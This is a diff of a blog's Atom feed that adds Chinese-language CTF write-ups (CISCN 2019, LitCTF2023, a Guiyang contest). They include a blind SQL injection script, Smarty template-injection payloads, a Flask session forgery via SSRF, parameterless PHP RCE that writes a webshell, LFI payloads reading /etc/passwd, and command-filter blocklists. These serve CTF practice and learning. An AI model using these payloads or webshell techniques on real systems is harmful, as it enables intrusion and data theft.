@@ -6,7 +6,7 @@
   <link href="http://van0308.github.io/atom.xml" rel="self"/>
   
   <link href="http://van0308.github.io/"/>
-  <updated>2023-04-26T15:16:00.683Z</updated>
+  <updated>2023-05-16T14:45:36.219Z</updated>
   <id>http://van0308.github.io/</id>
   
   <author>
@@ -15,6 +15,142 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CISCN 2019华北Day2 Web1</title>
+    <link href="http://van0308.github.io/2023/05/buu_web/ciscn/CISCN-2019%E5%8D%8E%E5%8C%97Day2-Web1/"/>
+    <id>http://van0308.github.io/2023/05/buu_web/ciscn/CISCN-2019%E5%8D%8E%E5%8C%97Day2-Web1/</id>
+    <published>2023-05-16T14:18:34.000Z</published>
+    <updated>2023-05-16T14:45:36.219Z</updated>
+    
+    <content type="html"><![CDATA[<p>fuzz发现很多都被过滤了。</p><p>发现是空格过滤了，用括号试试，再试试异或，OK</p><p>exp</p><p>拿之前的异或脚本改一改</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1^(ascii(substr((select(flag)from(flag)),1,1))&gt;1)^1</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot;http://node2.anna.nssctf.cn:28140/index.php&quot;</span><br><span class="line">payload = &quot;1^(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;</span><br><span class="line">i = 0</span><br><span class="line">mess_ok = &quot;glzjin wants a girlfriend.&quot;</span><br><span class="line"># mess_false = &quot;not&quot;</span><br><span class="line">out = &quot;&quot;</span><br><span class="line">while True:</span><br><span class="line">    i += 1</span><br><span class="line">    begin = 32</span><br><span class="line">    end = 128</span><br><span class="line">    tmp = (begin + end) // 2</span><br><span class="line">    while begin &lt; end:</span><br><span class="line">        # url=url+p_dlen.format(i)   错误写法，url会一直增加</span><br><span class="line">        # res=requests.get(url)</span><br><span class="line">        # new_url = url + payload.format(i,chr(tmp))</span><br><span class="line">        new_url = url</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;id&quot;: payload.format(i, tmp)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(new_url,data=data)</span><br><span class="line">        # print(res.text)</span><br><span class="line">        # print(new_url)</span><br><span class="line">        # print(begin,end,tmp)</span><br><span class="line">        if res.status_code == 429:</span><br><span class="line">            print(&quot;too fast&quot;)</span><br><span class="line">            time.sleep(0.5)</span><br><span class="line">        if mess_ok in res.text:</span><br><span class="line">            # print(i)</span><br><span class="line">            begin = tmp + 1</span><br><span class="line">        else:</span><br><span class="line">            end = tmp</span><br><span class="line">        tmp = (begin + end) // 2</span><br><span class="line">        # print(i)</span><br><span class="line">    if begin == 32 or end == 128:</span><br><span class="line">        break</span><br><span class="line">    out += chr(tmp)</span><br><span class="line">    print(out)</span><br><span class="line"></span><br><span class="line">NSSCTF&#123;b29f1060-322b-49af-8bb9-a90c4ff6c5a4&#125;</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;fuzz发现很多都被过滤了。&lt;/p&gt;
+&lt;p&gt;发现是空格过滤了，用括号试试，再试试异或，OK&lt;/p&gt;
+&lt;p&gt;exp&lt;/p&gt;
+&lt;p&gt;拿之前的异或脚本改一改&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=</summary>
+      
+    
+    
+    
+    
+    <category term="SQL" scheme="http://van0308.github.io/tags/SQL/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>“CISCN2019 华东南赛区 Web11”</title>
+    <link href="http://van0308.github.io/2023/05/buu_web/ciscn/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BAWeb11/"/>
+    <id>http://van0308.github.io/2023/05/buu_web/ciscn/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BAWeb11/</id>
+    <published>2023-05-16T13:29:53.000Z</published>
+    <updated>2023-05-16T14:16:54.664Z</updated>
+    
+    <content type="html"><![CDATA[<p>题目打开有xff头（但nss我试了没有），试着改一改，发现可能是注入点，然后进行注入即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">看到有操作是直接&#123;&#123;system(&#x27;cat /flag&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>不过考点应该是smarty的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;</span><br><span class="line">Smarty支持使用&#123;php&#125;&#123;/php&#125;标签来执行被包裹其中的php指令。 </span><br><span class="line">如 &#123;php&#125;phpinfo();&#123;/php&#125;</span><br><span class="line">但是3.1.30已废除&#123;php&#125;标签</span><br><span class="line">Smarty的&#123;if&#125;条件判断和PHP的if 非常相似，只是增加了一些特性。全部的PHP条件表达式和函数都可以在if内使用，如*||*,or,&amp;&amp;,and,is_array(), 等等。</span><br><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;ls&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if show_source(&#x27;/flag&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.freebuf.com/column/219913.html">https://www.freebuf.com/column/219913.html</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;题目打开有xff头（但nss我试了没有），试着改一改，发现可能是注入点，然后进行注入即可。&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;</summary>
+      
+    
+    
+    
+    
+    <category term="ssti" scheme="http://van0308.github.io/tags/ssti/"/>
+    
+    <category term="smarty" scheme="http://van0308.github.io/tags/smarty/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>LitCTF2023</title>
+    <link href="http://van0308.github.io/2023/05/%E7%AB%9E%E8%B5%9B/LitCTF2023/"/>
+    <id>http://van0308.github.io/2023/05/%E7%AB%9E%E8%B5%9B/LitCTF2023/</id>
+    <published>2023-05-16T12:59:39.000Z</published>
+    <updated>2023-05-16T13:01:44.053Z</updated>
+    
+    <content type="html"><![CDATA[<p>web 基本做出来了，除了SQL还有session伪造还有无事发生（社工，找GitHub链接，然后在无事发生那个文件里面找）</p><p>贴一些链接，感觉比赛作为入门挺好的</p><p><a href="https://blog.csdn.net/Aluxian_/article/details/130657256">https://blog.csdn.net/Aluxian_/article/details/130657256</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;web 基本做出来了，除了SQL还有session伪造还有无事发生（社工，找GitHub链接，然后在无事发生那个文件里面找）&lt;/p&gt;
+&lt;p&gt;贴一些链接，感觉比赛作为入门挺好的&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/Aluxian_/ar</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>CISCN2019 华东南赛区 Web4</title>
+    <link href="http://van0308.github.io/2023/05/buu_web/ciscn/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/"/>
+    <id>http://van0308.github.io/2023/05/buu_web/ciscn/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web4/</id>
+    <published>2023-05-16T11:45:41.000Z</published>
+    <updated>2023-05-16T13:06:08.081Z</updated>
+    
+    <content type="html"><![CDATA[<p>代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># encoding:utf-8</span><br><span class="line">import re, random, uuid, urllib</span><br><span class="line">from flask import Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = str(random.random()*233)</span><br><span class="line">app.debug = True</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    session[&#x27;username&#x27;] = &#x27;www-data&#x27;</span><br><span class="line">    return &#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/read&#x27;)</span><br><span class="line">def read():</span><br><span class="line">    try:</span><br><span class="line">        url = request.args.get(&#x27;url&#x27;)</span><br><span class="line">        m = re.findall(&#x27;^file.*&#x27;, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)</span><br><span class="line">        if m or n:</span><br><span class="line">            return &#x27;No Hack&#x27;</span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        return res.read()</span><br><span class="line">    except Exception as ex:</span><br><span class="line">        print str(ex)</span><br><span class="line">    return &#x27;no response&#x27;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/flag&#x27;)</span><br><span class="line">def flag():</span><br><span class="line">    if session and session[&#x27;username&#x27;] == &#x27;fuck&#x27;:</span><br><span class="line">        return open(&#x27;/flag.txt&#x27;).read()</span><br><span class="line">    else:</span><br><span class="line">        return &#x27;Access denied&#x27;</span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=True,</span><br><span class="line">        host=&quot;0.0.0.0&quot;</span><br><span class="line">    )</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查Mac</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/read?url=../../../sys/class/net/eth0/address</span><br><span class="line">得到fa:6a:b8:98:32:4a </span><br></pre></td></tr></table></figure><p>注意Mac转化要用Python2</p><p>然后用Python脚本即可</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;代码&lt;/p&gt;
+&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# encoding:utf-8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;li</summary>
+      
+    
+    
+    
+    
+    <category term="flask session 伪造" scheme="http://van0308.github.io/tags/flask-session-%E4%BC%AA%E9%80%A0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://van0308.github.io/2023/05/%E7%AB%9E%E8%B5%9B/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF/"/>
+    <id>http://van0308.github.io/2023/05/%E7%AB%9E%E8%B5%9B/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF/</id>
+    <published>2023-05-12T15:15:12.834Z</published>
+    <updated>2023-05-12T15:15:44.047Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/weixin_42744595/article/details/130567542">https://blog.csdn.net/weixin_42744595/article/details/130567542</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzkzNTQzNTQzMQ==&mid=2247484307&idx=1&sn=f32529f761a8b6675cd98235a4ba45d3&chksm=c2af4e5bf5d8c74d90a7a52881261a540fcea6dcea4e92059043eeb3192eca8f2a35d1fec050&mpshare=1&scene=23&srcid=0511mEgG3O1QQeAUBR2dMAMn&sharer_sharetime=1683815293967&sharer_shareid=cfad11f42ce92eed4932225e44fcc1c0#rd">https://mp.weixin.qq.com/s?__biz=MzkzNTQzNTQzMQ==&amp;mid=2247484307&amp;idx=1&amp;sn=f32529f761a8b6675cd98235a4ba45d3&amp;chksm=c2af4e5bf5d8c74d90a7a52881261a540fcea6dcea4e92059043eeb3192eca8f2a35d1fec050&amp;mpshare=1&amp;scene=23&amp;srcid=0511mEgG3O1QQeAUBR2dMAMn&amp;sharer_sharetime=1683815293967&amp;sharer_shareid=cfad11f42ce92eed4932225e44fcc1c0#rd</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/weixin_42744595/article/details/130567542&quot;&gt;https://blog.csdn.net/weixin_42744595/article/details/130567542</summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>贵阳数博会2023</title>
+    <link href="http://van0308.github.io/2023/04/%E7%AB%9E%E8%B5%9B/%E8%B4%B5%E9%98%B3%E6%95%B0%E5%8D%9A%E4%BC%9A/"/>
+    <id>http://van0308.github.io/2023/04/%E7%AB%9E%E8%B5%9B/%E8%B4%B5%E9%98%B3%E6%95%B0%E5%8D%9A%E4%BC%9A/</id>
+    <published>2023-04-27T12:39:29.000Z</published>
+    <updated>2023-05-04T14:19:56.927Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="PING"><a href="#PING" class="headerlink" title="PING"></a>PING</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OK：</span><br><span class="line">&amp; </span><br><span class="line">url编码</span><br><span class="line">BAN:</span><br><span class="line">;</span><br><span class="line">|</span><br><span class="line">`</span><br><span class="line">/</span><br><span class="line">^</span><br><span class="line">~</span><br><span class="line">&gt;</span><br><span class="line">&lt;</span><br><span class="line">?</span><br><span class="line">$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">badrequest #</span><br><span class="line"></span><br><span class="line">数组也不行</span><br><span class="line">l\s</span><br><span class="line">ls&amp;curl 127.0.0.1 一点延迟回显都没有</span><br><span class="line">可以直接访问flag.php</span><br><span class="line"></span><br><span class="line">赛后居然发现是nl flag.php </span><br><span class="line">无语了</span><br></pre></td></tr></table></figure><h4 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h4><p>简单的链子</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Fastdestruct 破坏掉就行了，把最后一个花括号删了。</span><br><span class="line">https://www.jianshu.com/p/38606134fdd6</span><br></pre></td></tr></table></figure><h4 id="May-be"><a href="#May-be" class="headerlink" title="May_be"></a>May_be</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $a))  &#123;</span><br><span class="line">    if (!preg_match(&quot;/sess|ion|head|ers|file|na|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&quot;,$a))&#123;</span><br><span class="line">        eval($a);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;May be you should bypass.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;nonono&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">nonono</span><br></pre></td></tr></table></figure><p>无参数rce</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br><span class="line">var_dump(get_defined_vars());</span><br><span class="line">拿网上的payload打一下，然后可以执行。结果是得提权。</span><br><span class="line">https://blog.csdn.net/Manuffer/article/details/120738755</span><br><span class="line"></span><br><span class="line">?a=eval(end(current(get_defined_vars())));&amp;shell=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure><p>找到权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null </span><br><span class="line">/bin/mount</span><br><span class="line">/bin/cp</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">做多了题目就发现，里面cp可能可以提权</span><br></pre></td></tr></table></figure><p>搜了一下cp提权可能得要输入密码，然后思路是写一句话木马，然后蚁剑链接，就可以终端输入密码了。然后就开始坑的地方</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目会把写的一句话木马的一些内容给你换掉，比如$_GET等，还有&#x27;单引号，换成空的，而$_GET我猜测只换了一次，那我双写一下试试，结果就写进去了，而&#x27;单引号，试了一下，发现会多次置空，那我猜测转义一下，没想到就写进去了。（如何发现的，我cat了我写进去的文件，发现我的马被人偷了一部分。。。然后对照着改的）</span><br><span class="line">下面是payload</span><br><span class="line">?a=eval(end(current(get_defined_vars())));</span><br><span class="line">&amp;shell=$_GET[&#x27;s&#x27;];&amp;s=system(&quot;echo &#x27;&lt;?php @eval($$_GET[1]_POST[&#x27;\&#x27;van\&#x27;&#x27;]);?&gt;&#x27; &gt; 2.php&quot;);</span><br><span class="line">写完直接访问2.php，记住蚁剑是用post的，不是用get的。</span><br></pre></td></tr></table></figure><p>然后进入终端交互模式，结果发现不能输入密码，提示说什么认证错误还是不允许。查找其他方法。</p><p>待学</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无参数rce</span><br><span class="line">https://blog.csdn.net/weixin_46330722/article/details/110840156</span><br><span class="line">https://www.cnblogs.com/pursue-security/p/15406272.html#_label1_5</span><br><span class="line">https://cloud.tencent.com/developer/article/1760288</span><br><span class="line">https://blog.csdn.net/Manuffer/article/details/120738755</span><br><span class="line">https://blog.csdn.net/weixin_30568317/article/details/116284685</span><br></pre></td></tr></table></figure><h4 id="Hackerconfused"><a href="#Hackerconfused" class="headerlink" title="Hackerconfused"></a>Hackerconfused</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$CanRead = false;</span><br><span class="line">class SFile&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public function __construct($name) &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $num = count(scandir($this-&gt;name));</span><br><span class="line">        if($num &gt; 0)&#123;</span><br><span class="line">            return &#x27;Not null&#x27;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return &#x27;Access the backdoor_******.php.* in [0-f]&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Funny&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public function __construct($name)&#123;</span><br><span class="line">        if(strstr($name, &#x27;backdoor&#x27;)===false)&#123;</span><br><span class="line">            $this-&gt;name = $name;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;name = &#x27;nohint.txt&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        global $CanRead;</span><br><span class="line">        if(strstr($name, &#x27;backdoor&#x27;)!==false)&#123;</span><br><span class="line">            die(&#x27;try again&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">        if($CanRead)&#123;</span><br><span class="line">            echo(file_get_contents($this-&gt;name));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public $secret = &#x27;nohint.txt&#x27;;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo $this-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        global $CanRead;</span><br><span class="line">        $CanRead = true;</span><br><span class="line">        return (new Funny($this-&gt;secret))-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;p&#x27;]))&#123;</span><br><span class="line">    unserialize(base64_decode($_GET[&#x27;p&#x27;]));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">任意读取文件，看到内网还有主机存活172.16.7.43，扫了一下，发现后面基本访问速度很慢，应该是不让扫的。那得换换思路。时间有限，没找出来。</span><br></pre></td></tr></table></figure><h4 id="不太喜欢flask的开发"><a href="#不太喜欢flask的开发" class="headerlink" title="不太喜欢flask的开发"></a>不太喜欢flask的开发</h4><p>题目描述：</p><p>这个开发以前做java的，不太喜欢flask，那源码中自然会有一些习惯和缺陷了</p><p>尝试：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开环境上去就得用户密码。</span><br><span class="line">最后得出来是tomcat/tomcat</span><br><span class="line">连上去后抓包</span><br><span class="line">有Authorization: Basic dG9tY2F0OnRvbWNhdA==</span><br><span class="line">然后response：</span><br><span class="line">you are not our client,please guess our SECRET_KEY and Generating cookies using keys ,then view /search?flag=***** </span><br><span class="line">直接访问/search?flag=后会</span><br><span class="line">&#123;&quot;msg&quot;:&quot;Missing cookie \&quot;access_token_cookie\&quot;&quot;&#125;</span><br><span class="line">加上cookie</span><br><span class="line">access_token_cookie=12334 会有no enough segments</span><br><span class="line">猜jwt</span><br><span class="line">access_token_cookie=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.04lcEO1dxtIIBa-Bt_tw8kmO8HpAwqb8BLCHz98S10w</span><br><span class="line">返回&#123;&quot;msg&quot;:&quot;Signature verification failed&quot;&#125;</span><br><span class="line">扫不到目录，搜了一下可能是WEB-INF/web.xml泄露，但是也不清楚</span><br></pre></td></tr></table></figure><h4 id="完美网站"><a href="#完美网站" class="headerlink" title="完美网站"></a>完美网站</h4><p>重定向-抓包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url base64解码得到tupian.png</span><br><span class="line">自己改改，会报错。然后说n是30-10的，自己加上get n</span><br><span class="line">不会报错。</span><br><span class="line">尝试爆破n，可以读出内容。</span><br><span class="line">读一下index.php</span><br><span class="line">然后尝试文件包含，找不到内容。</span><br><span class="line">卡住。没想到tupian.png有信息。winhex分析，最下面有提示一个PHP文件</span><br><span class="line">ffffpq.php</span><br><span class="line">然后读取就行了。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;å«éå®åäºï¼èµ¶å¿«è®©æï¼?n=30-10,ä»¥åçæ°å¼ã)-_-&quot;;</span><br><span class="line">$image=$_GET[&#x27;img&#x27;];</span><br><span class="line"></span><br><span class="line">$allow = range(2,20);</span><br><span class="line">shuffle($allow);</span><br><span class="line"></span><br><span class="line">if(($_GET[&#x27;n&#x27;]==$allow[0]))&#123;</span><br><span class="line">$image = base64_decode($image);</span><br><span class="line">$data = base64_encode(file_get_contents($image));</span><br><span class="line">echo &quot;&lt;img src=&#x27;data:image/png;base64,$data&#x27;/&gt;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$image = base64_encode(&quot;tupian.png&quot;);</span><br><span class="line">header(&quot;location:/?img=&quot;.$image);</span><br><span class="line">&#125;//index.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一些尝试</span><br><span class="line">读不出来</span><br><span class="line">../../../flag</span><br><span class="line">Flag.php</span><br><span class="line">Flag.txt</span><br><span class="line">读得出来</span><br><span class="line">/etc/passwd</span><br><span class="line">../../../var/www/html/index.php</span><br><span class="line">../../../etc/passwd</span><br><span class="line">php://filter/convert.base64-encode/resource=index.php</span><br><span class="line">php://filter/convert.base64-encode/resource=/etc/passwd</span><br><span class="line">data://text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</span><br><span class="line">会被解析，返回PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==       &lt;?php system(&quot;cat flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本来没去分析一下图片，还想着上传临时文件，然后去文件包含呢。。。</span><br></pre></td></tr></table></figure><h4 id="notrce"><a href="#notrce" class="headerlink" title="notrce"></a>notrce</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$c=$_POST[&#x27;c&#x27;];</span><br><span class="line">if(!preg_match(&quot;/vi|less|tail|head|od|sh|echo|touch|re|mv|rm|cat|ls|tac|more|cut|curl|wget|base|&gt;|&lt;|`|\*|\\$|\\\/i&quot;,$c))&#123;</span><br><span class="line">    exec($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;hacker&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=cp /flag 1.txt</span><br><span class="line">无回显rce，直接出了，可能还可以取反绕过</span><br><span class="line">待学学（坑）</span><br><span class="line">https://blog.csdn.net/weixin_46706771/article/details/119031343</span><br><span class="line">https://www.cnblogs.com/pursue-security/p/15406672.html</span><br></pre></td></tr></table></figure><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="传说中的小黑"><a href="#传说中的小黑" class="headerlink" title="传说中的小黑"></a>传说中的小黑</h4><p>下载下来是一个图片，winhex 正常分析一波，看到有zip，foremost出来，要密码。那么尝试一下伪加密，改了一下没成功。那么寻找密钥，在图片winhex中找到了一段base64的密文，就在压缩包文件头（PK)前面,然后得到密码。解压后得到一大串数据，观察一下，A-Z,0-9,base16(hex)。cyberchef转换一下，然后输出为文件。观察到是JFIF——图片，少了文件头，手动添加一下 FFD8FFE0，然后再打开即可。扫一下二维码。</p><p>（拖到winhex中，然后在文件头右键——编辑——粘贴0字节，4个。然后敲即可）</p><p>坑：利用一个在线网站得出来的是错误的，换成cyberchef就正常了。（在操作那里拖一个from hex出来。就行了。</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h3&gt;&lt;h4 id=&quot;PING&quot;&gt;&lt;a href=&quot;#PING&quot; class=&quot;headerlink&quot; title=&quot;PING&quot;&gt;&lt;/a&gt;PIN</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>[b01lers2020]Life on Mars</title>
@@ -314,138 +450,6 @@
     <summary type="html">&lt;p&gt;F12&lt;/p&gt;
 &lt;p&gt;base32解码&lt;/p&gt;
 &lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1nD3x.php&lt;/span&gt;&lt;br&gt;&lt;/pre</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>[网鼎杯 2020 半决赛]AliceWebsite</title>
-    <link href="http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E4%B8%89%E9%A1%B5/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-AliceWebsite/"/>
-    <id>http://van0308.github.io/2023/04/buu_web/%E7%AC%AC%E4%B8%89%E9%A1%B5/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E5%8D%8A%E5%86%B3%E8%B5%9B-AliceWebsite/</id>
-    <published>2023-04-22T14:39:34.000Z</published>
-    <updated>2023-04-26T15:41:38.420Z</updated>
-    
-    <content type="html"><![CDATA[<p>文件包含</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include</span><br><span class="line">data协议不行</span><br><span class="line">input也不行</span><br><span class="line">无语，直接遍历包含。</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;文件包含&lt;/p&gt;
-&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;include&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dat</summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>ctfshowweb1000</title>
-    <link href="http://van0308.github.io/2023/04/ctfshow/web/ctfshowweb1000/"/>
-    <id>http://van0308.github.io/2023/04/ctfshow/web/ctfshowweb1000/</id>
-    <published>2023-04-06T08:26:23.000Z</published>
-    <updated>2023-04-26T12:29:37.650Z</updated>
-    
